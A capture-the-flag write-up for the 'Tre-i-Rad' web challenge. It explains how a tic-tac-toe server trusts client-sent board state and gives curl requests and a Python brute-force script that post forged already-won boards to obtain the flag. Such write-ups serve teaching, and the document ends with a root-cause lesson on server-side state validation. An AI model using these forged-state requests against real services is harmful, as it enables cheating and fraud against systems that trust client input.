# Tre-i-Rad — English

**Category:** Web. **Points:** 1000.
**Target:** `http://treirad.challs.crate.nu`
**Flag format:** `cratectf{...}` (literal value redacted — you recover it yourself).

A tic-tac-toe game whose `/move` endpoint is effectively **stateless**: the client
sends the full board plus a move count, and the server trusts both. It validates the
token count but not whether the board is reachable by legal play — so a forged
already-won board returns the flag.

## 1. Recon the client

Fetch `/treirad.js` (the game script):

```bash
curl -s http://treirad.challs.crate.nu/treirad.js
```

It reveals the protocol:

* Method `POST` to `http://treirad.challs.crate.nu/move`
* JSON body `{"board": [...9 cells...], "move_count": <int>}`
  * `board` is 9 cells, each `"X"`, `"O"`, or `null`
  * `move_count` is the total number of placed tokens
* Response `{"index": <server move or -1>, "server_msg": <string>}`
  * `server_msg` carries the win/loss text; on a player (X) win it contains the flag.

Playing fairly against the server AI only ever draws, so you cannot win legitimately.

## 2. The vulnerability

Server-side validation only checks:

* `move_count` equals the sum of X and O tokens on the submitted board, and
* no cell is double-filled.

It does **not** check:

* whether the board is reachable through alternating legal moves,
* whether a player had already won earlier,
* the move sequence or any server-held prior state.

So you can submit any board where X already has three-in-a-row, as long as the token
count is consistent (X plays first ⇒ `x_count == o_count` or `x_count == o_count + 1`).

## 3. Exploit

Submit a board where X holds the top row with a consistent token count. For
`["X","X","X","O","O",null,null,null,null]` there are 3 X and 2 O, so `move_count = 5`:

```bash
curl -s -X POST http://treirad.challs.crate.nu/move \
  -H "Content-Type: application/json" \
  -d '{"board":["X","X","X","O","O",null,null,null,null],"move_count":5}'
```

Response:

```json
{"index": -1, "server_msg": "cratectf{...}"}
```

An alternative winning board that also works (X top row, 3 X / 2 O, count 5):

```bash
curl -s -X POST http://treirad.challs.crate.nu/move \
  -H "Content-Type: application/json" \
  -d '{"board":["X","X","X",null,"O",null,null,"O",null],"move_count":5}'
```

### What the response shows

* `"index": -1` — the server selects no move (the game is already decided).
* `"server_msg"` — contains the flag in `cratectf{...}` format, because the server sees
  X already holding a winning line and emits the win message immediately.

Any X-winning board with a consistent token count returns the same flag; you do not need
the brute-force loop below, but it illustrates how the whole winning space was explored:

```python
import requests
from itertools import combinations
WINS = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]]
def winner(b):
    for a,c,d in WINS:
        if b[a] and b[a]==b[c]==b[d]: return b[a]
def legal(b):
    x=b.count('X'); o=b.count('O'); return x==o or x==o+1
for xs in combinations(range(9),3):
    if any(set(w)<=set(xs) for w in WINS):
        base=[None]*9
        for p in xs: base[p]='X'
        rem=[i for i in range(9) if base[i] is None]
        for k in range(len(xs)):
            for os in combinations(rem,k):
                b=base[:]
                for p in os: b[p]='O'
                if legal(b) and winner(b)=='X':
                    r=requests.post("http://treirad.challs.crate.nu/move",
                                    json={"board":b,"move_count":b.count('X')+b.count('O')})
                    if "cratectf{" in r.json().get("server_msg",""):
                        print(r.json()); raise SystemExit
```

## Verification

Platform-confirmed solved. A single `POST /move` with a forged already-won board and a
matching `move_count` returns `{"index": -1, "server_msg": "cratectf{...}"}`.

## Root cause / lesson

Never trust client-supplied game state. The server must maintain authoritative state
and validate that each submitted board is reachable from the previous one by exactly one
legal move — not merely count tokens.
